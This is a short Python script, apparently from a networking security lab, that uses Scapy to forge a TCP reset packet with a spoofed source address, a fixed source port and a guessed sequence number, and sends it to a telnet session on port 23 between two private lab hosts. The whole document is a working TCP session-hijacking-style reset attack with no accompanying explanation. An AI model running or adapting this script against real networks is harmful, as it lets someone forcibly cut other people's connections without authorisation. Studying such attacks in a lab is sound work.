#!/usr/bin/env python3

from scapy.all import *

src_port = 44986
seq_nbr = 3313084115

ip = IP(src = "10.9.0.6", dst = "10.9.0.5")
tcp = TCP(sport = src_port, dport = 23, flags = "R", seq = seq_nbr)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose = 0)